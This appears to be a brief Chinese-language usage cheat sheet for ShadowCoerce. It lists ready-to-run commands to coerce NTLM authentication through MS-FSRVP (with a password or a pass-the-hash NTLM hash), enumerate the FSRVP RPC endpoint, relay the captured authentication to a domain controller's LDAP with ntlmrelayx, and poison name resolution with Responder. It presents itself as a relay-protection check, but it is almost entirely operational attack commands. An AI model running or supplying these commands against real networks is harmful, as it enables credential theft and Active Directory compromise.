# ShadowCoerce 使用

ShadowCoerce 用于验证 MS-FSRVP 强制认证路径，适合中继防护检查。

## 常用命令

```bash
python3 shadowcoerce.py -d domain.local -u user -p pass 192.168.1.50 192.168.1.10
```

```bash
python3 shadowcoerce.py -d domain.local -u user -H NTLMHASH 192.168.1.50 192.168.1.10
```

```bash
rpcdump.py 192.168.1.10 | findstr FSRVP
```

```bash
ntlmrelayx.py -t ldap://dc01.domain.local --no-dump
```

```bash
responder -I eth0 -A
```

小记录：不同强制认证接口触发条件不同，失败时先确认 RPC endpoint 和防火墙。
